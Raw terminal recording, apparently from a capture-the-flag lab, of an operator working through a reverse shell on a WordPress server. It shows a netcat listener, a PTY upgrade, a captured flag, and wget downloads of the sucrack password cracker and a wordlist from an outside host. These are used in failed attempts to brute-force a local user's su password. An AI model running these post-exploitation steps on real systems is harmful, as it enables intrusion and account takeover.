@@ -1,0 +1,1943 @@
+Script started on 2025-02-21 10:21:23+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 11030
+SOCKET: Shell has connected! PID: 2257
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data)
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bqsh[K[K[Kash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@ubuntu:/var/www/subdomain$ [Kwww-data@ubuntu:/var/www/subdomain$ [K[?2004hwww-data@ubuntu:/var/www/subdomain$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kannouncements	 wp-admin	       wp-includes	  wp-signup.php
+index.php	 wp-blog-header.php    wp-links-opml.php  wp-trackback.php
+license.txt	 wp-comments-post.php  wp-load.php	  xmlrpc.php
+readme.html	 wp-config.php	       wp-login.php
+reverse.php	 wp-content	       wp-mail.php
+wp-activate.php  wp-cron.php	       wp-settings.php
+www-data@ubuntu:/var/www/subdomain$ [Kwww-data@ubuntu:/var/www/subdomain$ [K[?2004hwww-data@ubuntu:/var/www/subdomain$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+www-data@ubuntu:/var/www$ [Kwww-data@ubuntu:/var/www$ [K[?2004hwww-data@ubuntu:/var/www$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+html  subdomain
+www-data@ubuntu:/var/www$ [Kwww-data@ubuntu:/var/www$ [K[?2004hwww-data@ubuntu:/var/www$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+www-data@ubuntu:/var$ [Kwww-data@ubuntu:/var$ [K[?2004hwww-data@ubuntu:/var$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+backups  crash	local  log   metrics  run    tmp
+cache	 lib	lock   mail  opt      spool  www
+www-data@ubuntu:/var$ [Kwww-data@ubuntu:/var$ [K[?2004hwww-data@ubuntu:/var$ cd www[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd www
+[Kcd www
+www-data@ubuntu:/var/www$ [Kwww-data@ubuntu:/var/www$ [K[?2004hwww-data@ubuntu:/var/www$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+html  subdomain
+www-data@ubuntu:/var/www$ [Kwww-data@ubuntu:/var/www$ [K[?2004hwww-data@ubuntu:/var/www$ ls [K[K[Kcd html[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd html
+[Kcd html
+www-data@ubuntu:/var/www/html$ [Kwww-data@ubuntu:/var/www/html$ [K[?2004hwww-data@ubuntu:/var/www/html$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+announcements	 wp-blog-header.php    wp-links-opml.php  wp-trackback.php
+index.php	 wp-comments-post.php  wp-load.php	  wwe3bbfla4g.txt
+license.txt	 wp-config.php	       wp-login.php	  xmlrpc.php
+readme.html	 wp-content	       wp-mail.php
+wp-activate.php  wp-cron.php	       wp-settings.php
+wp-admin	 wp-includes	       wp-signup.php
+www-data@ubuntu:/var/www/html$ [Kwww-data@ubuntu:/var/www/html$ [K[?2004hwww-data@ubuntu:/var/www/html$ cat ww   [K[K[K[7mwwe3bbfla4g.txt[27m[7mcat [27mwwe3bbfla4g.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat wwe3bbfla4g.txt
+[Kcat wwe3bbfla4g.txt
+[KTHM{343a7e2064a1d992c01ee201c346edff}
+www-data@ubuntu:/var/www/html$ [Kwww-data@ubuntu:/var/www/html$ [K[?2004hwww-data@ubuntu:/var/www/html$ cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home
+www-data@ubuntu:/home$ [Kwww-data@ubuntu:/home$ [K[?2004hwww-data@ubuntu:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Khakanbey
+www-data@ubuntu:/home$ [Kwww-data@ubuntu:/home$ [K[?2004hwww-data@ubuntu:/home$ su hakanbey[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsu hakanbey
+[Ksu hakanbey
+[KPassword: [KPassword: [K[?2004hPassword: test[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004htest
+[K
+[Ksu: Authentication failure
+[Kwww-data@ubuntu:/home$ [Kwww-data@ubuntu:/home$ [K[?2004hwww-data@ubuntu:/home$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kwww-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ wget http://10.8.61.245/[7msucrack_1.2.3-5_arm64.deb[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mwget http://10.8.61.245/[27msucrack_1.2.3-5_arm64.deb[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget http://10.8.61.245/sucrack_1.2.3-5_arm64.deb
+[Kwget http://10.8.61.245/sucrack_1.2.3-5_arm64.deb
+[K--2025-02-21 07:28:02--  http://10.8.61.245/sucrack_1.2.3-5_arm64.deb
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 17432 (17K) [application/vnd.debian.binary-package]
+Saving to: 'sucrack_1.2.3-5_arm64.deb'
+
+          sucrack_1   0%[                    ]       0  --.-KB/s               [K          sucrack_1   0%[                    ]       0  --.-KB/s               [K          sucrack_1   0%[                    ]       0  --.-KB/s                        sucrack_1.  77%[==============>     ]  13.25K  54.8KB/s               sucrack_1.2.3-5_arm 100%[===================>]  17.02K  70.1KB/s    in 0.2s    
+
+2025-02-21 07:28:03 (70.1 KB/s) - 'sucrack_1.2.3-5_arm64.deb' saved [17432/17432]
+
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+sucrack_1.2.3-5_arm64.deb
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ [7mwget http://10.8.61.245/[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwget http://10.8.61.245/custom.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget http://10.8.61.245/custom.txt
+[Kwget http://10.8.61.245/custom.txt
+--2025-02-21 07:32:05--  http://10.8.61.245/custom.txt
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 703891 (687K) [text/plain]
+Saving to: 'custom.txt'
+
+custom.txt            0%[                    ]       0  --.-KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               [Kcustom.txt            1%[                    ]  12.00K  37.6KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               [Kcustom.txt            3%[                    ]  21.17K  37.8KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               custom.txt            5%[>                   ]  38.62K  43.9KB/s               [Kcustom.txt            5%[>                   ]  38.62K  43.9KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               custom.txt            5%[>                   ]  38.62K  43.9KB/s               custom.txt           10%[=>                  ]  74.40K  62.0KB/s               [Kcustom.txt           10%[=>                  ]  74.40K  62.0KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               custom.txt            5%[>                   ]  38.62K  43.9KB/s               custom.txt           10%[=>                  ]  74.40K  62.0KB/s               custom.txt           17%[==>                 ] 117.82K  81.7KB/s               [Kcustom.txt           17%[==>                 ] 117.82K  81.7KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               custom.txt            5%[>                   ]  38.62K  43.9KB/s               custom.txt           10%[=>                  ]  74.40K  62.0KB/s               custom.txt           17%[==>                 ] 117.82K  81.7KB/s               custom.txt           21%[===>                ] 146.08K  86.9KB/s               [Kcustom.txt           21%[===>                ] 146.08K  86.9KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               custom.txt            5%[>                   ]  38.62K  43.9KB/s               custom.txt           10%[=>                  ]  74.40K  62.0KB/s               custom.txt           17%[==>                 ] 117.82K  81.7KB/s               custom.txt           21%[===>                ] 146.08K  86.9KB/s               custom.txt           29%[====>               ] 203.04K   102KB/s               [Kcustom.txt           29%[====>               ] 203.04K   102KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               custom.txt            5%[>                   ]  38.62K  43.9KB/s               custom.txt           10%[=>                  ]  74.40K  62.0KB/s               custom.txt           17%[==>                 ] 117.82K  81.7KB/s               custom.txt           21%[===>                ] 146.08K  86.9KB/s               custom.txt           29%[====>               ] 203.04K   102KB/s               custom.txt           44%[=======>            ] 306.66K   132KB/s               custom.txt           60%[===========>        ] 418.50K   164KB/s               [Kcustom.txt           60%[===========>        ] 418.50K   164KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               custom.txt            5%[>                   ]  38.62K  43.9KB/s               custom.txt           10%[=>                  ]  74.40K  62.0KB/s               custom.txt           17%[==>                 ] 117.82K  81.7KB/s               custom.txt           21%[===>                ] 146.08K  86.9KB/s               custom.txt           29%[====>               ] 203.04K   102KB/s               custom.txt           44%[=======>            ] 306.66K   132KB/s               custom.txt           60%[===========>        ] 418.50K   164KB/s               custom.txt           65%[============>       ] 453.55K   162KB/s               [Kcustom.txt           65%[============>       ] 453.55K   162KB/s               [Kcustom.txt            0%[                    ]       0  --.-KB/s               custom.txt            1%[                    ]  12.00K  37.6KB/s               custom.txt            3%[                    ]  21.17K  37.8KB/s               custom.txt            5%[>                   ]  38.62K  43.9KB/s               custom.txt           10%[=>                  ]  74.40K  62.0KB/s               custom.txt           17%[==>                 ] 117.82K  81.7KB/s               custom.txt           21%[===>                ] 146.08K  86.9KB/s               custom.txt           29%[====>               ] 203.04K   102KB/s               custom.txt           44%[=======>            ] 306.66K   132KB/s               custom.txt           60%[===========>        ] 418.50K   164KB/s               custom.txt           65%[============>       ] 453.55K   162KB/s               custom.txt           93%[=================>  ] 640.09K   211KB/s    eta 0s     custom.txt          100%[===================>] 687.39K   215KB/s    in 3.2s    
+
+2025-02-21 07:32:10 (215 KB/s) - 'custom.txt' saved [703891/703891]
+
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+custom.txt  sucrack_1.2.3-5_arm64.deb
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ dpkg -x [7msucrack_1.2.3-5_arm64.deb[27msucrack_1.2.3-5_arm64.deb sucrack[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdpkg -x sucrack_1.2.3-5_arm64.deb sucrack
+[Kdpkg -x sucrack_1.2.3-5_arm64.deb sucrack
+[Kwww-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+custom.txt  sucrack  sucrack_1.2.3-5_arm64.deb
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ chmod +x sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x sucrack
+[Kchmod +x sucrack
+[Kwww-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ cd suc    [Krack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd sucrack
+[Kcd sucrack
+www-data@ubuntu:/tmp/sucrack$ [Kwww-data@ubuntu:/tmp/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/sucrack$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+usr
+www-data@ubuntu:/tmp/sucrack$ [Kwww-data@ubuntu:/tmp/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/sucrack$ cd usr[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd usr
+[Kcd usr
+www-data@ubuntu:/tmp/sucrack/usr$ [Kwww-data@ubuntu:/tmp/sucrack/usr$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+bin  share
+www-data@ubuntu:/tmp/sucrack/usr$ [Kwww-data@ubuntu:/tmp/sucrack/usr$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr$ cd bin[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd bin
+[Kcd bin
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+sucrack
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ chmod +x sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x sucrack
+[Kchmod +x sucrack
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+sucrack
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ cp -rv ../../../custom[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kcd ../../..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ../../..
+[Kcd ../../..
+www-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+custom.txt  sucrack  sucrack_1.2.3-5_arm64.deb
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ cp -rv su [Kcrack/usr/bin/sucrack .[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcp -rv sucrack/usr/bin/sucrack .
+[Kcp -rv sucrack/usr/bin/sucrack .
+[Kcp: cannot overwrite directory './sucrack' with non-directory
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ cd sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd sucrack
+[Kcd sucrack
+www-data@ubuntu:/tmp/sucrack$ [Kwww-data@ubuntu:/tmp/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/sucrack$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+usr
+www-data@ubuntu:/tmp/sucrack$ [Kwww-data@ubuntu:/tmp/sucrack$ [K[?2004hwww-data@ubuntu:/tmp/sucrack$ cd usr[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd usr
+[Kcd usr
+www-data@ubuntu:/tmp/sucrack/usr$ [Kwww-data@ubuntu:/tmp/sucrack/usr$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+bin  share
+www-data@ubuntu:/tmp/sucrack/usr$ [Kwww-data@ubuntu:/tmp/sucrack/usr$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr$ cd bin[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd bin
+[Kcd bin
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+sucrack
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ cp -rv ../../../custom.txt .[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcp -rv ../../../custom.txt .
+[Kcp -rv ../../../custom.txt .
+'../../../custom.txt' -> './custom.txt'
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -w 100 -b 500 -u hakanbey custom.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -w 100 -b 500 -u hakanbey custom.txt
+[K<bin$ ./sucrack -w 100 -b 500 -u hakanbey custom.txt
+[Kbash: ./sucrack: cannot execute binary file: Exec format error
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ chmod +x sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x sucrack
+[Kchmod +x sucrack
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ [7m./sucrack -w 100 -b 500 -u hakanbey custom.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -w 100 -b 500 -u hakanbey custom.txt
+[K<bin$ ./sucrack -w 100 -b 500 -u hakanbey custom.txt
+[Kbash: ./sucrack: cannot execute binary file: Exec format error
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -h[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -h
+[K./sucrack -h
+[Kbash: ./sucrack: cannot execute binary file: Exec format error
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ ls -q[Kal[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 724
+drwxr-xr-x 2 www-data www-data   4096 Feb 21 07:34 .
+drwxr-xr-x 4 www-data www-data   4096 Sep 12  2018 ..
+-rw-rw-rw- 1 www-data www-data 703891 Feb 21 07:34 custom.txt
+-rwxr-xr-x 1 www-data www-data  26632 Sep 12  2018 sucrack
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ cd ../../..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ../../..
+[Kcd ../../..
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hl
+[Kl
+bash: l: command not found
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+custom.txt  sucrack  sucrack_1.2.3-5_arm64.deb
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ rm sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm sucrack
+[Krm sucrack
+rm: cannot remove 'sucrack': Is a directory
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ rm -rf sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm -rf sucrack
+[Krm -rf sucrack
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+custom.txt  sucrack_1.2.3-5_arm64.deb
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ dpkg -w[Kx [7msucrack_1.2.3-5_arm64.deb[27msucrack_1.2.3-5_arm64.deb sucrack[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdpkg -x sucrack_1.2.3-5_arm64.deb sucrack
+[Kdpkg -x sucrack_1.2.3-5_arm64.deb sucrack
+[Kwww-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ cp -rv cu [Kstom.txt sucrack.[K/usr/bin[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcp -rv custom.txt sucrack/usr/bin
+[Kcp -rv custom.txt sucrack/usr/bin
+'custom.txt' -> 'sucrack/usr/bin/custom.txt'
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ cd sucrack/usr/bin[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd sucrack/usr/bin
+[Kcd sucrack/usr/bin
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+custom.txt  sucrack
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -u hakanbey custom.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./sucrack -u hakanbey custom.txt
+[K./sucrack -u hakanbey custom.txt
+[Kbash: ./sucrack: cannot execute binary file: Exec format error
+www-data@ubuntu:/tmp/sucrack/usr/bin$ [Kwww-data@ubuntu:/tmp/sucrack/usr/bin$ [K[?2004hwww-data@ubuntu:/tmp/sucrack/usr/bin$ uae[K[Kname -a[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004huname -a
+[Kuname -a
+[KLinux ubuntu 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
